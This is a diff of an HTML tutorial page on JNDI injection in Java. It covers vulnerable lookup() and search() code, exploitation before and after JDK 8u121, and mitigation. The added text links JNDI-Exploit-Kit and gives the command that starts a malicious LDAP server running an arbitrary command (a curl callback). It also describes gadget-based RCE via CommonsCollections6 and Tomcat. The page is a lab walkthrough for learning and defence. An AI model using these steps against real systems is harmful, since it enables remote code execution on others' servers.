@@ -11,20 +11,15 @@ layout: default
         <p></p>
         <ul style="text-align: left;">
             <li>What is JNDI Injection</li>
-            <li>How does the vulnerable Code Looks like</li>
-            <li>How to exploit&nbsp; it</li>
+            <li>Vulnerable Code Signature</li>
+            <li>Exploitation</li>
             <ul>
                 <li>Before JAVA 8u121</li>
                 <li>After Java 8u121</li>
-                <ul>
-                    <li>Using Known Gadgets</li>
-                    <ul>
-                        <li>Using Tomcat gadget</li>
-                        <li>Using other gadgets present on ysoserial</li>
-                    </ul>
-                </ul>
             </ul>
-            <li>How to fix it</li>
+            <li>Mitigation</li>
+            <li>Root Cause Analysis</li>
+            <li>Building your Own Malicious LDAP Server</li>
         </ul>
         <h3 style="text-align: left;">What is JNDI Injection:</h3>
         <div>JNDI stands for Java Naming Directory.</div>
@@ -50,7 +45,7 @@ layout: default
                 <li>import javax.naming.NamingException;</li>
                 <li>import javax.naming.directory.*;</li>
             </ul>
-            <h3 style="text-align: left;">How Does the Vulnerable Code Looks Like:</h3></div>
+            <h3 style="text-align: left;">Vulnerable Code Signature:</h3></div>
         <div>Before looking at the vulnerable code , lets look at how the actual use case code looks like.</div>
         <div>Now there 2 things primarily gets done by the JNDI.</div>
         <div>
@@ -64,7 +59,7 @@ layout: default
             <br />
         </div>
         <p><img src="images/jndiInjection/jndisearch.png"></p>
-        <div>Similarly, lets say you have an application which takes and ldap server configuration , there the operation that primarily going to happen is a Ldap LoopUp.</div>
+        <div>Similarly, lets say you have an application which takes and ldap server configuration , there the operation that primarily going to happen is a Ldap Look Up.</div>
         <div>
             <br />
         </div>
@@ -72,12 +67,12 @@ layout: default
         <div>
             <br />
         </div>
-        <div>Well there many reasons but lets take the below scenario into account .</div>
+        <div>Well there are many reasons but lets take the below scenario into account .</div>
         <div>
             <br />
         </div>
         <div>Lets say you have an application which allows you to use your ldap server for authentication,</div>
-        <div>Now in order to do that the application first needs to take the ldap servicer configuration and perform a look up and once the lookup is successful then the rest of the process continures.</div>
+        <div>Now in order to do that the application first needs to take the ldap servicer configuration and perform a look up and once the lookup is successful then the rest of the process continues.</div>
         <div>
             <br />
         </div>
@@ -85,11 +80,16 @@ layout: default
         <div>
             <p><img src="images/jndiInjection/jndilookup.png"></p>
         <div>Now both the above code is vulnerable to JNDI Injection.</div>
+        <h3 style="text-align: left;">Exploitation:</h3>
+        <div>The exploitation for both the sitatuion is same.</div>
+        <div>
+            <br />
+        </div>
         <h4 style="text-align: left;">For lookup():</h4>
         <div>if we can control the input for the ctx.lookup() then we can acieve JNDI injection and eventually a Remote Code Execution/</div>
         <h4 style="text-align: left;">For Search():</h4>
-        <div>If we control the input for the search we can do nothing.</div>
-        <div>But if you see the above , you will notice that on the ctx.search() we are sending an object of the searchControll class.</div>
+        <div>For a successful exploitation of the search() we need to have the seach attribute in controll plus setReturningObjectFlag of the searchControl class needs to be true.</div>
+        <div>if you see the above , you will notice that on the ctx.search() we are sending an object of the searchControll class.</div>
         <div>
             <br />
         </div>
@@ -106,11 +106,6 @@ layout: default
         <div>
             <br />
         </div>
-        <h3 style="text-align: left;">Exploitation:</h3>
-        <div>The exploitation for both the sitatuion is same.</div>
-        <div>
-            <br />
-        </div>
         <div>To exploit this vulnerability we have to host a ldap server which can return a malicious Object which upon deserlisation can get us a code exuection.</div>
         <div>
             <br />
@@ -120,7 +115,7 @@ layout: default
             <br />
         </div>
         <h4 style="text-align: left;">On JDK &lt;=8u121:</h4>
-        <div>On JDK &lt;=8u121 the we can send serialized data in such a way that the JNDI loads a class from a remote server and if that class contains malicious code , then th.at code gets executed.</div>
+        <div>On JDK &lt;=8u121 the we can send serialized data in such a way that the JNDI loads a class from a remote server and execute it.</div>
         <div>
             <br />
         </div>
@@ -128,11 +123,12 @@ layout: default
         <div>
             <br />
         </div>
-        <div>com/sun/jndi/ldap/VersionHelper.java#55 sets the value of the&nbsp;com.sun.jndi.ldap.object.trustURLCodebase property to True and in later version this value has been made to False.</div>
+        <div>com/sun/jndi/ldap/VersionHelper.java#55 sets the value of the&nbsp;com.sun.jndi.ldap.object.trustURLCodebase property to True.</div>
+            <div>In higher version of jdk this property's default value is set to false but if your application explicitly set it to true then on higher vesions of jdk you can load a remote class as well.</div>
         <div>
             <br />
         </div>
-        <div>Hence on JDK &lt;=8u121 you can directly load a remote class over LDAP or RMI</div>
+        <div>Hence on <b><i>JDK &lt;=8u121</i></b> you can directly load a remote class over LDAP or RMI</div>
         <div>
             <br />
         </div>
@@ -164,31 +160,30 @@ layout: default
         </div>
         </div>
         
-        <div>You can get the VulnerableApplication from&nbsp;</div>
+        <div>You can get the VulnerableApplication from <a href="https://github.com/w3bspl01t3r/VulnerableApps">Here</a></div>
         <div>
             <br />
         </div>
-        <div>https://github.com/w3bspl01t3r/VulnerableApps</div>
+        <div>We will use <a href="https://github.com/pimps/JNDI-Exploit-Kit/tree/master">JNDI-Exploit-Kit</a> as the malicious LDAP Server</div>
         <div>
-        <P>we will first exploit it on JDK 8u121</P>
+        <P><i><b>we will first exploit it on JDK 8u121</b></i></P>
         <p>
             you can first compile the app with JDK 8u121 by downloading the jdk8u121 from Oracle site and putting it in the class path.
         </p>
         <p>
         
-            Now lets download the JNDI Exploit Kit from
-            <p>https://github.com/pimps/JNDI-Exploit-Kit/tree/master</p>
+            Now lets download the JNDI-Exploit-Kit
         
         </p>
         <p>Lets Compile the JNDI Exploit Kit and start our malicious JNDI server</p>
         <p>mvn clean package</p>
-        <p>java -jar JNDI-Exploit-Kit-1.0-SNAPSHOT-all.jar -C "touch /tmp/pwned.txt"</p>
+        <p>java -jar JNDI-Exploit-Kit-1.0-SNAPSHOT-all.jar  -C "curl http://localhost:9001/ExploitWith8u121Success"</p>
         <p>The above will generate some ldap and rmi urls, pick the right url and feed it to the app.</p>
-        <p>You will see the file /tmp/pwned.txt created</p>
+        <p>You will see that we got a http call back to our server as shown on the below image</p>
         <p><img src="images/jndiInjection/jndilookupExploit8u121.png"></p>
         </div>
         
-        <div><p>we will now exploit it on JDK version higher than 8u121</p>
+        <div><p><i><b>we will now exploit it on JDK version higher than 8u121</b></i></p>
         
             <p>Key point here is that we need to have to have a gadget on the class path to Get Full fledge RCE on JDK version
                 higher than 8u121+ and 8u191+
@@ -214,19 +209,18 @@ layout: default
          <p> you will see ,this time the operations on the ldap server is different.</p>
          <p>instead of pointing to the remote class the ldap server has returned a serialised data which is for CommonsCollections6 gadget</p>
          <P>and we have successfully exploited the vulnerablity</P>
+         <p><img src="images/jndiInjection/SuccessFulexploitWithGadget.png"></p>
         </div>
         <h3>Using Tomcat WebServer</h3>
         <p> Now the way we exploit the vulnerablity in a tomcat server is by utilising a gadget present on the tomcat class Path</p>
         <p>The gadget is tomcat version specific.THe last version i check where it was working was tomcat 8.0.75<NEEDS TO BE VERIFIED></p>
-        <p></p>
-        <h3>Why we need a gadget in higher version of JDK i.e after 8u121+ or 8u191+</h3>
         <div>
             <br />
         </div>
         <div>
             <br />
         </div>
-        <h3 style="text-align: left;">How to Fix:</h3>
+        <h3 style="text-align: left;">Mitigation:</h3>
         <h4>For lookup():</h4>
         <div>The vulnerability here lies on the Custom App written by the developer which passes the user controlled data to the initialContext.Lookup().</div>
         <div>
@@ -236,40 +230,14 @@ layout: default
         <div>
             <br />
         </div>
-        <h4 style="text-align: left;">For lookup():</h4>
+        <h4 style="text-align: left;">For search():</h4>
         <div>The default value of SearchControls.setReturningObjFlag () is set to False.</div>
         <div>So unless the flag is explicitly set to True , the search() is not vulnerable and can be used as it is.</div>
-        <div>
-            <br />
-        </div>
-        <div>
-            <br />
-        </div>
-        <div>
-            <br />
-        </div>
-        <div>
-            <br />
-        </div>
-        <div>
-            <br />
-        </div>
-        <div>
-            <br />
-        </div>
-        <div>
-            <br />
-        </div>
-        <div>
-            <br />
-        </div>
-        <div>
-            <br />
-        </div>
-        <div>
-            <br />
-        </div>
-        <p></p>
+        <h3 style="text-align: left;">Root Cause Analysis:</h3>
+        <h3 style="text-align: left;">Building your Own Malicious LDAP Server</h3>
+        <div><p>The Ldap server can be built for 2 purpose</p>
+        <ul><li>For remote class loading</li>
+        <li>For sending Seriliased Data that uses Gadgets present in the class path to Acived RCE</li></ul></div>
 
 
 
